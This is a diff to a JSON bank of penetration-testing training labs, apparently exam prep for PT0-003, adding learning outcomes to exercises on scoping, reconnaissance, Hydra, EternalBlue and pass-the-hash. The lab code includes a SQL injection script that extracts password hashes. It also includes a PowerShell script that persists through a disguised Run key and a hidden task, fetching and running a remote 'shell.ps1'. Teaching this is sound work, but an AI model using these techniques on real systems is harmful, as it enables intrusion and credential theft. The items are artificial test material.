@@ -10,6 +10,13 @@
     "category": "Engagement Management",
     "technologies": ["Rules of Engagement", "Scoping", "Contracts"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Order the six pre-engagement activities that precede any active testing",
+      "Distinguish scoping, rules of engagement, and contracting responsibilities",
+      "Explain why each step must complete before the next begins"
+    ],
+    "realWorldValue": "Skipping or reordering pre-engagement steps is how pentest teams end up legally exposed or testing out-of-scope assets. The order is not a suggestion; it is the basis of every professional engagement.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "You have been hired to perform a penetration test against Acme Corp's external network. Before any scanning or exploitation can begin, the pre-engagement phase must be completed in the correct order.\n\nArrange the following six activities in the order they should be completed.",
     "steps": [
       {
@@ -56,6 +63,13 @@
     "category": "Report Writing",
     "technologies": ["Report Writing", "Executive Summary", "Risk Ratings", "Remediation"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Match each pentest report section to its intended audience and content",
+      "Separate executive-summary content from technical-finding content",
+      "Align remediation guidance with risk ratings"
+    ],
+    "realWorldValue": "The report is the deliverable clients actually pay for. Getting the section responsibilities right is what separates a report that drives remediation from one that gets filed and ignored.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A junior analyst has mixed up the descriptions for each section of the final penetration test report. Match each report section to what it should contain.\n\nNote: confusing these sections is a common exam question topic — knowing what belongs in an executive summary versus a findings register is tested directly.",
     "pairs": [
       {
@@ -102,6 +116,13 @@
     "category": "Rules of Engagement",
     "technologies": ["Scoping", "YAML", "Rules of Engagement"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Identify scope-document errors that expose the tester to legal liability",
+      "Validate in-scope and out-of-scope assets, time windows, and authorised techniques",
+      "Correct a YAML engagement scope to a signable state"
+    ],
+    "realWorldValue": "A broken scope document is a real-world incident waiting to happen. Every finding has to be traceable to written authorisation, and catching scope errors before client signoff is a core project-manager skill.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "Before a penetration test begins, the project manager generates a YAML scope document that is committed to the engagement repository and signed off by the client.\n\nThis file has four bugs:\n1. An out-of-scope subnet is also listed under `in_scope`\n2. The testing window contains an impossible time value\n3. A mandatory legal sign-off field is missing entirely\n4. The methodology does not match what was agreed in the contract (grey-box)\n\nFix all four issues.",
     "language": "yaml",
     "brokenCode": "engagement:\n  client: Acme Corp\n  test_type: external\n  methodology: black-box\n  in_scope:\n    - 10.0.1.0/24\n    - 10.0.5.0/24\n    - 192.168.10.0/24\n  out_of_scope:\n    - 10.0.5.0/24\n    - 10.0.99.0/24\n  testing_window: \"23:00-25:00\"\n  emergency_contact: security@acmecorp.com",
@@ -137,6 +158,13 @@
     "category": "Active Reconnaissance",
     "technologies": ["Nmap", "TCP/IP", "Service Detection"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Run Nmap SYN scans, service version detection, and OS fingerprinting",
+      "Produce structured XML output suitable for downstream tooling",
+      "Select the correct flags for each enumeration goal"
+    ],
+    "realWorldValue": "Nmap is the first tool every external pentest reaches for. Knowing the flag combinations for each stage of enumeration is muscle memory that saves hours per engagement.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A target host at 10.10.10.50 is in scope for an external penetration test. You need to enumerate its services, attempt OS fingerprinting, and save the results in XML format for import into your report tool.\n\nComplete each task in order using the simulated terminal below.",
     "commands": [
       {
@@ -187,6 +215,13 @@
     "category": "DNS Enumeration",
     "technologies": ["dig", "dnsrecon", "DNS", "Zone Transfer"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Query MX records, attempt zone transfers, and brute-force subdomains",
+      "Perform reverse-DNS lookups against an IP range",
+      "Complete dig and dnsrecon command templates correctly"
+    ],
+    "realWorldValue": "DNS is still where external attack surface hides. Teams that enumerate DNS well find forgotten staging hosts, dev APIs, and third-party services that never appear in the client-provided asset list.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "You are enumerating DNS for example.com during the reconnaissance phase. DNS enumeration can expose mail servers, internal hostnames, and zone data that maps the target's entire infrastructure.\n\nComplete each command by filling in the missing flag or argument.",
     "questions": [
       {
@@ -263,6 +298,13 @@
     "category": "Passive Reconnaissance",
     "technologies": ["Shodan", "OSINT", "Banner Grabbing", "CVE"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Parse a Shodan API response for exposed services and software versions",
+      "Separate in-scope findings from out-of-scope findings",
+      "Flag end-of-life software and unauthenticated services for follow-up"
+    ],
+    "realWorldValue": "Passive OSINT on Shodan costs nothing and often surfaces the most embarrassing exposures before any active scan runs. Knowing how to read the response without noise is a reconnaissance fundamental.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "During passive reconnaissance for a client engagement, you run a Shodan query against the target organisation's IP range. Passive recon means you are querying Shodan's existing index — you are NOT sending packets to the target.\n\nReview the four service entries below and answer the questions that follow.",
     "logs": [
       {
@@ -325,6 +367,13 @@
     "category": "Script Modification",
     "technologies": ["Python", "WHOIS", "Socket", "Banner Grabbing"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Debug a Python reconnaissance script with type, library, and encoding bugs",
+      "Handle binary responses safely when decoding banners",
+      "Replace deprecated whois library keyword arguments"
+    ],
+    "realWorldValue": "Custom tooling is a daily reality on longer engagements. Fixing small Python bugs in recon scripts without restarting from scratch is the difference between a day of output and a day of yak-shaving.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "During the reconnaissance phase you are using a Python script to automate WHOIS lookups and TCP banner grabbing against a list of target hosts.\n\nThe script has three bugs that prevent it from running correctly:\n1. The socket port argument is passed as a string, not an integer\n2. The whois library call uses a deprecated keyword argument name\n3. The banner decode() call has no error handler, causing crashes when services return binary data\n\nFix all three issues.",
     "language": "python",
     "brokenCode": "import socket\nimport whois\nimport sys\n\nTARGETS = [\n    (\"10.10.10.50\", \"22\"),\n    (\"10.10.10.50\", \"80\"),\n    (\"10.10.10.50\", \"3306\"),\n]\n\nDOMAINS = [\"example.com\", \"corp-target.com\"]\n\n\ndef grab_banner(host, port):\n    \"\"\"Connect to host:port and return the service banner.\"\"\"\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(3)\n        s.connect((host, port))\n        s.send(b\"HEAD / HTTP/1.0\\r\\n\\r\\n\")\n        banner = s.recv(1024)\n        s.close()\n        return banner.decode()\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\ndef whois_lookup(domain):\n    \"\"\"Return registrar and creation date for a domain.\"\"\"\n    try:\n        w = whois.whois(domain, flags=0)\n        return f\"{domain}: registrar={w.registrar}, created={w.creation_date}\"\n    except Exception as e:\n        return f\"[error] {e}\"\n\n\nif __name__ == \"__main__\":\n    print(\"=== Banner Grabbing ===\")\n    for host, port in TARGETS:\n        banner = grab_banner(host, port)\n        print(f\"  {host}:{port} -> {banner}\")\n\n    print(\"\\n=== WHOIS Lookups ===\")\n    for domain in DOMAINS:\n        result = whois_lookup(domain)\n        print(f\"  {result}\")",
@@ -356,6 +405,13 @@
     "category": "Vulnerability Scanning",
     "technologies": ["Nessus", "Authenticated Scanning", "Credentials", "SSH"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Configure Nessus credentials for authenticated internal scans",
+      "Select the correct scan policy, port range, and plugin family",
+      "Recognise configuration errors that produce unauthenticated output"
+    ],
+    "realWorldValue": "An unauthenticated Nessus scan misses most real findings. Configuring the authenticated path correctly is the difference between a thin report and one that actually reflects the environment.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A junior analyst prepared a Nessus scan policy for an internal network assessment, but made four configuration errors. As currently saved, the policy will run an unauthenticated stealth scan with active checks suppressed — significantly reducing finding coverage.\n\nCorrect each setting to match the requirements for a valid authenticated internal penetration test.",
     "configItems": [
       {
@@ -407,6 +463,13 @@
     "category": "Web Application Scanning",
     "technologies": ["Nikto", "Web Application Testing", "HTTP"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Run Nikto against HTTP and HTTPS targets",
+      "Identify outdated web server versions, exposed admin panels, and missing headers",
+      "Combine multiple Nikto flags for a complete web-server baseline"
+    ],
+    "realWorldValue": "Nikto is noisy but fast, and it is still the quickest way to triage a web server for low-hanging findings before deeper testing. The flag combinations here are the ones that show up on every engagement.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A target web server runs at http://10.10.10.80 and also serves HTTPS on port 443. You need to: (1) run a basic Nikto scan against the HTTP service, (2) re-run with SSL/TLS support against port 443, and (3) save output to a file for the pentest report.\n\nComplete each task using the simulated terminal below.",
     "commands": [
       {
@@ -457,6 +520,13 @@
     "category": "Vulnerability Analysis",
     "technologies": ["Nessus", "Vulnerability Validation", "False Positive Analysis"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Validate scanner findings against evidence panels and version data",
+      "Identify false positives caused by banner mismatches or protocol confusion",
+      "Triage a mixed findings list into real issues and noise"
+    ],
+    "realWorldValue": "Clients judge a pentest by the quality of its findings, not the quantity. Shipping a report full of unvalidated false positives destroys credibility; catching them before the report goes out is the work.",
+    "relatedExamCodes": ["PT0-003"],
     "nodes": [
       {"id": "host", "label": "Target Host — 10.10.10.80", "x": 350, "y": 200},
       {"id": "f1", "label": "FINDING-001: OpenSSL Heartbleed", "x": 80, "y": 40},
@@ -580,6 +650,13 @@
     "category": "Authentication Attacks",
     "technologies": ["Hydra", "Brute Force", "SSH", "Wordlists"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Run Hydra against SSH with single-user and wordlist attacks",
+      "Limit thread count to avoid account lockout and detection",
+      "Select the right flag shape for credential testing"
+    ],
+    "realWorldValue": "Credential-stuffing is one of the most common real-world attack paths. Running the tool responsibly, with lockout-aware thread limits, is how a professional pentester operates rather than an amateur who bricks the target.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A target host at 10.10.10.22 has SSH exposed on port 22. Intelligence gathered during reconnaissance identified potential usernames. You need to: (1) run a single-user attack against the admin account using rockyou.txt, (2) run a multi-user attack against a username list with reduced threads to avoid triggering account lockout.\n\nComplete each task using the simulated terminal below.",
     "commands": [
       {
@@ -625,6 +702,13 @@
     "category": "Web Application Attacks",
     "technologies": ["SQL Injection", "Python", "UNION-based SQLi", "requests"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Debug a UNION-based SQL injection script for column count, encoding, and regex bugs",
+      "URL-encode payloads for ORDER BY and other protected clauses",
+      "Match response parsing to the actual server output shape"
+    ],
+    "realWorldValue": "Automated SQLi tooling breaks on anything non-trivial, and every engagement eventually needs a hand-written script. Fixing the three most common mistakes at once is a realistic exploitation exercise.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A Python script automates a UNION-based SQL injection attack against a vulnerable search form to extract usernames and password hashes. The script contains three bugs that prevent it from working correctly:\n\n1. The UNION SELECT column count does not match the query structure\n2. The ORDER BY fingerprinting payload is appended to the URL without URL-encoding\n3. The regex pattern does not match the actual HTML response structure\n\nFix all three bugs.",
     "language": "python",
     "brokenCode": "import requests\nimport re\nimport urllib.parse\n\nTARGET = \"http://10.10.10.80/search\"\nSESSION_TOKEN = \"a3f5d9e1b2c4f6e8\"\n\ndef test_order_by(n):\n    '''Test ORDER BY n to fingerprint the column count.'''\n    payload = f\"1' ORDER BY {n}-- -\"\n    url = TARGET + \"?id=\" + payload\n    r = requests.get(url, cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return \"You have an error in your SQL syntax\" not in r.text\n\ndef get_column_count():\n    '''Return the number of columns in the vulnerable query.'''\n    for n in range(1, 10):\n        if not test_order_by(n):\n            return n - 1\n    return -1\n\ndef extract_credentials():\n    '''Dump usernames and password hashes using UNION SELECT.'''\n    payload = \"0' UNION SELECT username,password_hash,NULL FROM users-- -\"\n    r = requests.get(TARGET, params={\"id\": payload},\n                     cookies={\"PHPSESSID\": SESSION_TOKEN})\n    return re.findall(r'<td class=\"user\">(.+?)</td>', r.text)\n\nif __name__ == \"__main__\":\n    print(\"[*] Fingerprinting column count via ORDER BY...\")\n    cols = get_column_count()\n    print(f\"[+] Found {cols} columns\")\n\n    print(\"[*] Extracting credentials via UNION SELECT...\")\n    creds = extract_credentials()\n    if creds:\n        for c in creds:\n            print(f\"  [+] {c}\")\n    else:\n        print(\"  [-] No results. Check column count and regex.\")",
@@ -656,6 +740,13 @@
     "category": "Service Exploitation",
     "technologies": ["Metasploit", "msfconsole", "EternalBlue", "SMB"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Search, configure, and launch the EternalBlue module from msfconsole",
+      "Set RHOSTS, payload, and listener options correctly",
+      "Complete the msfconsole command template for a full exploitation flow"
+    ],
+    "realWorldValue": "EternalBlue is still the canonical Metasploit walkthrough, and fluency in msfconsole is assumed on any engagement that touches Windows. The command template here mirrors what you would actually type under time pressure.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A target host at 10.10.10.100 is running an unpatched Windows SMB service vulnerable to MS17-010 (EternalBlue). Your listener IP is 10.10.14.5.\n\nComplete each msfconsole command to search for the module, select it, configure the target and payload, and execute the exploit.",
     "questions": [
       {
@@ -737,6 +828,13 @@
     "category": "Credential Attacks",
     "technologies": ["Pass-the-Hash", "Mimikatz", "NTLM", "CrackMapExec", "Lateral Movement"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Order the seven steps of a pass-the-hash attack from foothold to domain controller",
+      "Place Mimikatz, CrackMapExec, and lateral movement in the correct sequence",
+      "Explain why hash extraction precedes authenticated lateral movement"
+    ],
+    "realWorldValue": "Pass-the-hash is one of the highest-impact attack paths against Active Directory and shows up on almost every internal engagement. Ordering the steps correctly is the backbone of every Windows privilege-escalation chapter in the report.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "An authenticated penetration test has provided initial access to a domain-joined Windows workstation. You will now execute a pass-the-hash attack to authenticate to the domain controller without cracking any passwords.\n\nArrange the seven steps in the correct sequence.",
     "steps": [
       {
@@ -788,6 +886,13 @@
     "category": "Cloud Security",
     "technologies": ["AWS IAM", "EC2 Metadata Service", "SSRF", "Cloud Security", "IMDSv2"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Identify overly permissive EC2 instance roles and unrestricted AssumeRole grants",
+      "Enforce IMDSv2 to close the SSRF-to-credentials attack path",
+      "Remediate three common AWS IAM misconfigurations in sequence"
+    ],
+    "realWorldValue": "Cloud IAM findings are now on every pentest report. The three misconfigurations here cover the most common real-world credential-theft and privilege-escalation paths in AWS environments.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A cloud security review of a client's AWS account has identified three IAM-related misconfigurations that create a credential theft and privilege escalation attack surface. Review each resource and select the correct remediation.",
     "issues": [
       {
@@ -840,6 +945,13 @@
     "category": "Web Application Attacks",
     "technologies": ["XSS", "Web Application Security", "Incident Response", "WAF", "Browser Security"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Correlate WAF alerts, application logs, and network metrics for a stored XSS event",
+      "Select the correct immediate response actions to contain the attack",
+      "Distinguish containment steps from investigation and remediation steps"
+    ],
+    "realWorldValue": "Being on the receiving end of a stored XSS event requires fast, calm triage across three log sources at once. Practising the correlation ahead of time is how responders avoid missing the entry point under pressure.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "A stored cross-site scripting (XSS) attack has been detected against the comment section of a public-facing blog application. WAF logs show a filter bypass, application logs show injected script content in the database, and network metrics show active cookie exfiltration to an external domain.\n\nReview the alerts, logs, and metrics, then select the three correct immediate response actions.",
     "alerts": [
       {
@@ -999,6 +1111,13 @@
     "category": "Attack Frameworks",
     "technologies": ["MITRE ATT&CK", "VLAN Hopping", "Credential Dumping", "Container Escape", "Prompt Injection"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Map common attack techniques to their MITRE ATT&CK tactic categories",
+      "Place VLAN hopping, credential dumping, and container escapes in the correct tactic",
+      "Use ATT&CK terminology consistently in reports and detections"
+    ],
+    "realWorldValue": "ATT&CK mapping is how pentest findings, detection engineering, and threat intel speak the same language. Getting the tactic categories right on report findings makes them directly actionable for the blue team.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "MITRE ATT&CK provides a standardised taxonomy of adversary tactics, techniques, and procedures. Modern pentest reports increasingly reference ATT&CK technique IDs to contextualise findings.\n\nMatch each attack technique on the left to its primary MITRE ATT&CK tactic category on the right.",
     "pairs": [
       {
@@ -1055,6 +1174,13 @@
     "category": "Post-Exploitation",
     "technologies": ["Post-Exploitation", "Persistence", "Lateral Movement", "Artifact Cleanup"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Order eight post-exploitation phases from foothold stabilisation to artefact cleanup",
+      "Distinguish persistence, lateral movement, and collection activities",
+      "Place artefact cleanup correctly as the final phase"
+    ],
+    "realWorldValue": "Post-exploitation is where engagements spend most of their time, and doing it in the right order keeps the environment stable and the access recoverable. Skipping cleanup leaves forensic artefacts that embarrass everyone.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "You have just achieved remote code execution on an internal workstation after exploiting a service vulnerability. Your objective is to demonstrate the complete post-exploitation attack chain against the target domain without triggering incident response.\n\nArrange the following eight activities in the correct operational order.",
     "steps": [
       { "id": "s1", "text": "Establish a stable initial foothold — upgrade to a persistent shell and confirm session reliability", "correctPosition": 1 },
@@ -1079,6 +1205,13 @@
     "category": "Lateral Movement",
     "technologies": ["Windows Event Logs", "PsExec", "Event ID 4624", "Lateral Movement", "SIEM"],
     "labCategory": "Troubleshoot",
+    "learningOutcomes": [
+      "Read Windows Security and System event logs for lateral-movement indicators",
+      "Identify PsExec, Event ID 4624 type 3, and related signals across multiple hosts",
+      "Separate attacker activity from normal remote-user logons"
+    ],
+    "realWorldValue": "Lateral movement detection is the high-value SIEM use case. Reading the log entries by hand, without relying on a canned rule, is what makes a useful detection engineer or incident responder.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "Your SIEM has forwarded Windows Security and System event log entries collected from seven domain hosts over a six-hour window. A security alert has flagged unusual authentication patterns in the 14:27–14:33 time range.\n\nAnalyse the log entries and select all correct statements below.",
     "logs": [
       { "timestamp": "2024-11-14 08:47:22", "level": "INFO", "source": "WS03-Security", "message": "Event ID 4624 — Successful logon. Account: alice@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
@@ -1128,6 +1261,13 @@
     "category": "Persistence",
     "technologies": ["PowerShell", "Registry Persistence", "HKCU Run Key", "Post-Exploitation", "Artifact Cleanup"],
     "labCategory": "Implement",
+    "learningOutcomes": [
+      "Fix bugs in a PowerShell registry-persistence and scheduled-task script",
+      "Set HKCU Run keys correctly for user-scope persistence",
+      "Debug scheduled-task registration as a fallback mechanism"
+    ],
+    "realWorldValue": "Persistence scripts break for small reasons: wrong hive, wrong quoting, wrong trigger. Fixing the common three at once mirrors a realistic post-exploitation task where the goal is survival across reboots.",
+    "relatedExamCodes": ["PT0-003"],
     "scenario": "During a post-exploitation phase you deploy a PowerShell persistence script that writes a registry Run key entry and registers a scheduled task as a fallback, then removes both artefacts when called with the -Cleanup switch.\n\nThe script has three bugs:\n1. The registry path contains a typo that points to a non-existent key.\n2. The Run key value is passed as the wrong PowerShell type.\n3. The cleanup section hangs waiting for interactive confirmation.\n\nFix all three bugs so the script establishes persistence correctly and cleans up without prompting.",
     "language": "powershell",
     "brokenCode": "# Establishes registry Run key persistence and a scheduled task backup, then cleans up on demand\nparam(\n    [switch]$Cleanup\n)\n\n$RegPath  = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Curent'\n$RegName  = 'WindowsUpdate'\n$PayloadPath = 'C:\\ProgramData\\svchost.ps1'\n$TaskName = 'WindowsUpdateHelper'\n\n# Write payload to disk\n$Payload = 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.50/shell.ps1\")'\nSet-Content -Path $PayloadPath -Value $Payload -Force\n\n# Establish registry Run key persistence\nif (-not (Test-Path $RegPath)) {\n    New-Item -Path $RegPath -Force | Out-Null\n}\nNew-ItemProperty -Path $RegPath -Name $RegName -Value { powershell.exe -WindowStyle Hidden -File $PayloadPath } -PropertyType String -Force\n\n# Create scheduled task as a backup persistence mechanism\n$Action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-WindowStyle Hidden -File ' + $PayloadPath)\n$Trigger  = New-ScheduledTaskTrigger -AtStartup\n$Settings = New-ScheduledTaskSettingsSet -Hidden\nRegister-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force\n\nif ($Cleanup) {\n    # Remove registry Run key value\n    Remove-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue\n    # Delete payload file\n    Remove-Item -Path $PayloadPath -Force -ErrorAction SilentlyContinue\n    # Remove scheduled task -- will hang without -Confirm:$false\n    Unregister-ScheduledTask -TaskName $TaskName\n}",
